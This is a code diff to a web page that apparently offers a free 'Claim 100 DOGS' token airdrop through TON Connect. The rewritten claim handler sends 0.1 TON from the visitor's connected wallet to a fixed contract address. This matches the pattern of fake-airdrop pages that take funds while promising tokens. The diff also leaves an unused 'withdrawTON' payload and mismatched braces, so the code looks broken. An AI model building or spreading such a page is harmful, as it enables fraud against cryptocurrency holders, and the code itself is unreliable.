@@ -9,6 +9,7 @@
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <script src="https://unpkg.com/tonweb@0.0.60/dist/tonweb.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <script src=" https://cdn.jsdelivr.net/npm/tonweb@0.0.66/src/index.min.js "></script>
     <style>
         :root {
             --primary-color: #2ecc71;
@@ -255,14 +256,14 @@
             </div>
             <div class="feature">
                 <i class="fas fa-users"></i>
-                <h3>Community1</h3>
+                <h3>Community</h3>
                 <p>Join DOGS holders</p>
             </div>
         </div>
 
         <div id="ton-connect"></div>
         <button id="claim-button">
-            <i class="fas fa-bone"></i> Claim 100 DOGS
+            <i class="fas fa-bone"></i> Claim 100 DOGS!
         </button>
 
         <div class="progress-container">
@@ -339,44 +340,41 @@
                 updateStatus('Preparing transaction...', 'info');
                 updateProgress(20);
 
-                javascript
 
-                document.getElementById('claim-button').addEventListener('click', async () => {
-                    try {
-                        if (!tonConnectUI.connected) {
-                            updateStatus('Please connect your wallet first', 'error');
-                            return;
+                let a = new TonWeb.boc.Cell();
+                a.bits.writeUint(0, 32);
+                a.bits.writeString("TON Connect 2 tutorial!");
+                let payload = TonWeb.utils.bytesToBase64(await a.toBoc());
+
+
+                const payloadBase64 = btoa("withdrawTON");
+
+                const transaction = {
+                    validUntil: Math.floor(Date.now() / 1000) + 300,
+                    messages: [
+                        {
+                            address: AIRDROP_CONTRACT_ADDRESS,
+                            amount: '100000000', // 0.1 TON (w nanotonach)
+                            payload: payload
                         }
+                    ]
+                };
 
-                        updateStatus('Preparing transaction...', 'info');
-                        const payload = btoa('Claim airdrop!');
-                        console.log('Payload (Base64):', payload);
+                updateProgress(40);
 
-                        const transaction = {
-                            validUntil: Math.floor(Date.now() / 1000) + 300,
-                            messages: [
-                                {
-                                    address: AIRDROP_CONTRACT_ADDRESS,
-                                    amount: '100000000', // 0.1 TON
-                                    payload: payload // Dodanie zakodowanego payloadu
-                                }
-                            ]
-                        };
+                const result = await tonConnectUI.sendTransaction(transaction);
+                console.log('Transaction result:', result);
 
+                updateProgress(80);
+                updateStatus('Transaction sent successfully!', 'success');
+                updateProgress(100);
 
-                        const result = await tonConnectUI.sendTransaction(transaction);
-                        console.log('Transaction result:', result);
-
-                        updateProgress(80);
-                        updateStatus('Transaction sent successfully!', 'success');
-                        updateProgress(100);
-
-                    } catch (error) {  // Teraz 'error' jest poprawnie zdefiniowane jako argument funkcji
-                        console.error('Transaction error:', error);
-                        updateStatus(`Transaction error: ${error.message}`, 'error');
-                        updateProgress(0);
-                    }
-                });
+            } catch (error) {
+                console.error('Transaction error:', error);
+                updateStatus(`Transaction error: ${error.message}`, 'error');
+                updateProgress(0);
+            }
+        });
     </script>
 </body>
 
